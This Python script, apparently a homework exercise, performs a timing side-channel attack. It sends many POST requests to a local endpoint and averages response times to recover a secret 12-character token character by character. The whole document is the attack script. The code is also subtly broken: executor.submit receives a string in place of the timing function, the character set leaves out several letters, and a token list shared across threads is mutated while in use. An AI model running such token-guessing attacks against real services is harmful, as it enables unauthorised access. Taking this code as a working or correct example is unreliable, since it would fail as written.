import requests
import time
from concurrent.futures import ThreadPoolExecutor

url = 'http://0.0.0.0:8080/hw6/ex1'
charset = 'abcdefghijklmnopqrstuvz0123456789'
LENGTH = 12
iterations = 50

def print_percent_done(index, total, bar_len=50, title='Loading'):
    percent_done = (index+1)/total*100
    percent_done = round(percent_done, 1)

    done = round(percent_done/(100/bar_len))
    togo = bar_len-done

    done_str = '█'*int(done)
    togo_str = '░'*int(togo)

    print(f'{title}: [{done_str}{togo_str}] {percent_done}% done', end='\r')

    if round(percent_done) == 100:
        print('\t✅')
    
def post(token):
    start = time.time()
    requests.post(url, json={"token": token})
    return time.time() - start

def validate(token):
    response = requests.post(url, json={"token": token})
    print(f'Token: {token} -> Status: ' + str(response.status_code))

def try_char(token, pos, curr_max, best_char):
    tot = 0
    for _ in range(iterations):
        tot += post(token)
    tot /= iterations
    
    if tot > curr_max[0]:
        curr_max.pop()
        curr_max.append(tot)
        best_char.pop()
        best_char.append(token[pos])

def main():

    token = ['*'] * LENGTH
    print_percent_done(-1, LENGTH)
    for pos in range(LENGTH):
        curr_max = [0]
        best_char = ['*']
        with ThreadPoolExecutor(max_workers=16) as executor:
            for char in charset:
                token[pos] = char
                executor.submit(''.join(token), pos, curr_max, best_char)

            executor.shutdown(wait=True)

        token[pos] = best_char[0]
        print_percent_done(pos, LENGTH)

    validate(''.join(token))

if __name__ == '__main__':
    main()